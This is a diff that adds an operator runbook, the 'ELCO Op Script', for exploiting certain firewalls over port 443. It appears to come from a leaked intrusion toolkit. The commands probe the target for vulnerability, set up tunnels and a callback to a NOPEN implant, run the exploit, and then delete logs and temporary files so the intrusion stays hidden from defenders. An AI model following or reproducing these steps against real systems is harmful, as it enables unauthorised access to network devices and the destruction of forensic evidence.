@@ -1,0 +1,99 @@
+mx
+:%s/TGTIP/ACTUALTARGET/g
+`x
+
+
+#ELCO Op Script
+
+####
+##
+## Versions have been tested ranging from 3.3.005.057.1 to 3.3.010.024.1
+## Should work against many firewalls with port 443 open. 
+## Will fail against older TS firewalls ( < v.3.3) and ARM based firewalls.
+## 
+####
+
+# Requires python 2.7 or greater and moving files to /current/bin. If you are planning on throw ELCO after trying candidate...remove these directories.
+cp -R /current/bin/FW/ELCO/* /current/bin/
+
+
+=================================================================
+
+# Needs to be open on 443
+-ping -r TGTIP -t -p 443
+
+# Try to determine version and ETAG from /current/bin
+l 443 TGTIP 443 
+./eligiblecontestant.py -t https://127.0.0.1:443 touch
+
+
+#This will create two log files in /current/bin/logs
+#Log files contain output from the tough including the Etag
+
+
+
+# Probe the target to confirm system vulnerability. You should get the OS version and will tell you if the  bugger can be exploited with ELCO.
+./eligiblecontestant.py -l probe
+
+
+#The probe will determine if the target is vulernable. You should see something like this:
+#[+] "HEAD /site/pages/index.html HTTP/1.1" 200 0
+#[+] Target is vulnerable. Safe to proceed.
+#[+] Saving session info to .last_session
+# In addition...if a user is logged in to the console or web interface, you will see the session information for the console and the users cookie will be printed if on via web interface.
+
+
+#Prepare to exploit. Need to set up tunnels using the correct NOPEN and noclient.
+#Make sure /current/bin/FW/ELCO/ELCO.cfg has the binpath to NOPEN
+#staticrats version 3.1.0.5-i586 has been tested and works as well.
+cd /current/bin/FW/NOPEN
+./noclient-3.0.5.3 -l RHP
+On pitch:
+r RHP 127.0.0.1 RHP
+
+
+#EXPLOIT - You can specify a certain NOPEN with -p as well.
+./eligiblecontestant.py -l exploit -c CBIP:RHP
+OR
+./eligiblecontestant.py -t https://127.0.0.1:RHP exploit -c CBIP:RHP
+
+
+#If nopen fails, but the probe succeeded, you should run the following to clean up and files that may be left behind.
+./eligiblecontestant.py -l clean
+
+
+#Congrats...hopefully you are on target
+#Time to remove Nopen and clean possible logs
+-lt /www/logs/
+#Check if any time stamps have occured. You may see something similar to rm: cannot remove `/www/cookie/x': No such file or directory
+# These logs are us and need to be cleaned out.
+-tail /www/logs/error_log
+#The probe may generate logs...check them here and delete the file if it exists.
+#If it logged, you will see a file that is .XXXXXXXX(where the X's are randomly generated)
+-ls -t /www/htdocs/site/pages/
+#Other files that are created and should be deleted if found.
+-lt /tmp
+-lt /tmp/cgiXXXXXXXX
+-lt /tmp/httpd
+-lt /tmp/htttpd
+-lt /tmp/ping
+-lt /tmp/command_pid
+-lt /tmp/pid
+
+
+### CHECK LOG FILES ###
+# If exploit/scan worked, there should not be any logs
+-cd /tmp
+date
+-ls /data/oops*
+
+# Ensure that these logs are not HUGE, then pull them back
+-get /data/oops*
+
+# If small you can -cat the recent file to see if we are in it.
+-cat 
+
+#Locally make a backup copy
+
+*Once you are done...you can move on to Installing Buzz
+
